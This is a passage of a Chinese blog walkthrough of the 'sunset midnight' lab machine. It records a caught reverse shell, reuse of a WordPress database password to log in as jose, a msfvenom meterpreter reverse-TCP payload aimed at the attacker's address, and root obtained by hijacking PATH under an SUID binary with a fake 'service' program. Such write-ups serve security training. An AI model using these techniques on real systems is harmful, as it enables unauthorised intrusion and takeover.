[192.168.56.106] from (UNKNOWN) [192.168.56.132] 44338<br>Linux midnight 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br> 23:38:47 up 43 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.03, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:91:bf:42 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.132/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 421sec preferred_lft 421sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe91:bf42/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@midnight:/$</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>反弹 shell 成功，接下来去网站根目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@midnight:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>  7643 drwxr-xr-x 3 root     root     4.0K Jul 16  2020 .<br>  7642 drwxr-xr-x 3 root     root     4.0K Jul 16  2020 ..<br>272451 drwxr-x--- 5 www-data www-data 4.0K Aug  2 23:17 wordpress<br>www-data@midnight:/var/www/html$ <span class="hljs-built_in">cd</span> wordpress<br><span class="hljs-built_in">cd</span> wordpress<br>www-data@midnight:/var/www/html/wordpress$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 220K<br>272451 drwxr-x---  5 www-data www-data 4.0K Aug  2 23:17 .<br>  7643 drwxr-xr-x  3 root     root     4.0K Jul 16  2020 ..<br>272450 -rw-r--r--  1 www-data www-data  461 Jul 16  2020 .htaccess<br>273192 -rw-r-----  1 www-data www-data  499 Jul 18  2020 index.php<br>273197 -rw-r-----  1 www-data www-data  20K Feb 12  2020 license.txt<br>273190 -rw-r-----  1 www-data www-data 7.2K Jan 10  2020 readme.html<br>274695 -rw-r-----  1 www-data www-data 6.8K Feb  6  2020 wp-activate.php<br>278726 drwxr-x---  9 www-data www-data 4.0K Jun 10  2020 wp-admin<br>273189 -rw-r-----  1 www-data www-data  351 Feb  6  2020 wp-blog-header.php<br>275241 -rw-r-----  1 www-data www-data 2.3K Jun  2  2020 wp-comments-post.php<br>273194 -rw-r-----  1 www-data www-data 3.2K Jul 18  2020 wp-config.php<br>278538 drwxr-x---  6 www-data www-data 4.0K Aug  2 23:35 wp-content<br>273193 -rw-r-----  1 www-data www-data 3.9K Feb  6  2020 wp-cron.php<br>278594 drwxr-x--- 21 www-data www-data  12K Jun 10  2020 wp-includes<br>273587 -rw-r-----  1 www-data www-data 2.5K Feb  6  2020 wp-links-opml.php<br>273588 -rw-r-----  1 www-data www-data 3.3K Feb  6  2020 wp-load.php<br>273195 -rw-r-----  1 www-data www-data  47K Feb  9  2020 wp-login.php<br>273586 -rw-r-----  1 www-data www-data 8.4K Apr 14  2020 wp-mail.php<br>273196 -rw-r-----  1 www-data www-data  19K Apr  9  2020 wp-settings.php<br>273191 -rw-r-----  1 www-data www-data  31K Feb  6  2020 wp-signup.php<br>275240 -rw-r-----  1 www-data www-data 4.7K Feb  6  2020 wp-trackback.php<br>273186 -rw-r-----  1 www-data www-data 3.1K Feb  6  2020 xmlrpc.php<br></code></pre></td></tr></table></figure><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>查看 wp-config.php 文件得到数据库用户 jose 的密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-comment">/** The name of the database for WordPress */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;wordpress_db&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL database username */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;jose&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL database password */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;645dc5a8871d2a4269d4cbe23f6ae103&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL hostname */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span> );<br><br><span class="hljs-comment">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span> );<br><br><span class="hljs-comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> );<br></code></pre></td></tr></table></figure><p>看一眼 home 目录中包含了 jose 用户，那就尝试数据库用户的密码是否与 jose 的密码重用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@midnight:/var/www/html/wordpress$ su jose<br>su jose<br>Password: 645dc5a8871d2a4269d4cbe23f6ae103<br><br>jose@midnight:/var/www/html/wordpress$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>jose<br>jose@midnight:/var/www/html/wordpress$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(jose) gid=1000(jose) <span class="hljs-built_in">groups</span>=1000(jose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)<br>jose@midnight:/var/www/html/wordpress$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux midnight 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br>jose@midnight:/var/www/html/wordpress$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> jose: 645dc5a8871d2a4269d4cbe23f6ae103<br><br>Sorry, user jose may not run sudo on midnight.<br></code></pre></td></tr></table></figure><p>交互性差点意思，不过开放了 22 端口尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_midnight]<br>└─$ ssh jose@192.168.56.132                                           <br>jose@192.168.56.132\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sat Jul 18 15:33:29 2020 from 192.168.100.139</span><br><span class="hljs-string">jose@midnight:~$ id</span><br><span class="hljs-string">uid=1000(jose) gid=1000(jose) groups=1000(jose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br></code></pre></td></tr></table></figure><p>看一看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:/tmp$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>没有收获，家目录中看一看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:/var/www/html/wordpress$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>jose@midnight:~$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 28K<br>272437 drwxr-xr-x 3 jose jose 4.0K Jul 18  2020 .<br>262151 drwxr-xr-x 3 root root 4.0K Jul 16  2020 ..<br>273166 lrwxrwxrwx 1 root root    9 Jul 16  2020 .bash_history -&gt; /dev/null<br>272439 -rw-r--r-- 1 jose jose  220 Jul 16  2020 .bash_logout<br>272440 -rw-r--r-- 1 jose jose 3.5K Jul 16  2020 .bashrc<br>278755 drwxr-xr-x 3 jose jose 4.0K Jul 16  2020 .<span class="hljs-built_in">local</span><br>273181 lrwxrwxrwx 1 root root    9 Jul 16  2020 .mysql_history -&gt; /dev/null<br>272438 -rw-r--r-- 1 jose jose  807 Jul 16  2020 .profile<br>272059 -rw------- 1 jose jose   33 Jul 16  2020 user.txt<br>jose@midnight:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>956a9564aa5632edca7b745c696f6575<br></code></pre></td></tr></table></figure><p>先拿到了 user 的 flag</p><p>接下来寻找提权的思路，看一看 SUID 权限文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:/tmp$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   134749     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su<br>   152548    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo<br>   275266     20 -rwsr-sr-x   1 root     root        16768 Jul 18  2020 /usr/bin/status<br>   131131     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn<br>   131136     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd<br>   131132     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh<br>   135085     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount<br>   134602     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp<br>   135083     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount<br>   131134     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd<br>   268427     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   143469     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   146860    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure><p>有个文件看着生疏 <code>/usr/bin/status</code>，尝试运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:/tmp$ /usr/bin/status<br>/usr/bin/status<br>● ssh.service - OpenBSD Secure Shell server<br>   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)<br>   Active: active (running) since Wed 2023-08-02 22:55:33 EDT; 50min ago<br>     Docs: man:sshd(8)<br>           man:sshd_config(5)<br>  Process: 410 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)<br> Main PID: 452 (sshd)<br>    Tasks: 1 (<span class="hljs-built_in">limit</span>: 1150)<br>   Memory: 3.6M<br>   CGroup: /system.slice/ssh.service<br>           └─452 /usr/sbin/sshd -D<br><br>Aug 02 22:55:33 midnight systemd[1]: Starting OpenBSD Secure Shell server...<br>Aug 02 22:55:33 midnight sshd[452]: Server listening on 0.0.0.0 port 22.<br>Aug 02 22:55:33 midnight sshd[452]: Server listening on :: port 22.<br>Aug 02 22:55:33 midnight systemd[1]: Started OpenBSD Secure Shell server.<br></code></pre></td></tr></table></figure><p>是服务信息的检查，看看其中有什么可读字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:~$ strings /usr/bin/status<br>/lib64/ld-linux-x86-64.so.2<br>libc.so.6<br>setuid<br><span class="hljs-built_in">printf</span><br>system<br>__cxa_finalize<br>setgid<br>__libc_start_main<br>GLIBC_2.2.5<br>_ITM_deregisterTMCloneTable<br>__gmon_start__<br>_ITM_registerTMCloneTable<br>u/UH<br>[]A\A]A^A_<br>Status of the SSH server:<br>service ssh status<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Debian 8.3.0-6) 8.3.0</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.7325</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">status.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">__init_array_end</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">__init_array_start</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">__libc_csu_fini</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">_edata</span><br><span class="hljs-string">system@@GLIBC_2.2.5</span><br><span class="hljs-string">printf@@GLIBC_2.2.5</span><br><span class="hljs-string">__libc_start_main@@GLIBC_2.2.5</span><br><span class="hljs-string">__data_start</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_IO_stdin_used</span><br><span class="hljs-string">__libc_csu_init</span><br><span class="hljs-string">__bss_start</span><br><span class="hljs-string">main</span><br><span class="hljs-string">setgid@@GLIBC_2.2.5</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">setuid@@GLIBC_2.2.5</span><br><span class="hljs-string">__cxa_finalize@@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.interp</span><br><span class="hljs-string">.note.ABI-tag</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br></code></pre></td></tr></table></figure><p>看到了这样一个命令 <code>service ssh status</code>，而且使用的是相对路径，那就尝试 SUID 环境变量利用提权</p><h3 id="SUID-环境变量利用提权"><a href="#SUID-环境变量利用提权" class="headerlink" title="SUID 环境变量利用提权"></a>SUID 环境变量利用提权</h3><p>这里专门去翻了一下红队笔记文档，因为自己构建的反弹 shell 的程序，反弹成功后没有回显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.56.106 LPORT=4444 -f elf &gt;shell.elf<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 1068640 bytes<br>Final size of elf file: 1068640 bytes<br><br><br>┌──(kali㉿kali)-[~/Downloads/sunset_midnight]<br>└─$ sudo nc -lvnp 4444           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 4444 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.132] 51694<br><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">id</span><br><span class="hljs-built_in">pwd</span><br>?<br>^C<br></code></pre></td></tr></table></figure><p>首先把当前路径加入到环境变量的最前面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ose@midnight:/tmp$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>jose@midnight:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games<br></code></pre></td></tr></table></figure><p>然后构造一个 c 源代码文件再编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span>                                                     </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;                                                                                                        <br>        setgid(<span class="hljs-number">0</span>);<br>        setuid(<span class="hljs-number">0</span>);<br>        system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编辑、编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:/tmp$ vim service.c<br>-bash: vim: <span class="hljs-built_in">command</span> not found<br>jose@midnight:/tmp$ vi service.c<br>jose@midnight:/tmp$ gcc service.c -o service<br>service.c: In <span class="hljs-keyword">function</span> ‘main’:<br>service.c:5:2: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]<br>  setgid(0);<br>  ^~~~~~<br>  setenv<br>service.c:6:2: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]<br>  setuid(0);<br>  ^~~~~~<br>  setenv<br>jose@midnight:/tmp$ <span class="hljs-built_in">ls</span><br>service    systemd-private-2e417010f87c4bc78758e4440be734b2-apache2.service-T1TnPZ<br>service.c  systemd-private-2e417010f87c4bc78758e4440be734b2-systemd-timesyncd.service-e80keR<br></code></pre></td></tr></table></figure><p>虽然有 warning 但还是得到了可执行文件，执行 status 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">jose@midnight:/tmp$ /usr/bin/status<br>root@midnight:/tmp<span class="hljs-comment"># whoami</span><br>root<br>root@midnight:/tmp<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)<br>root@midnight:/tmp<span class="hljs-comment"># cd /root</span><br>root@midnight:/root<span 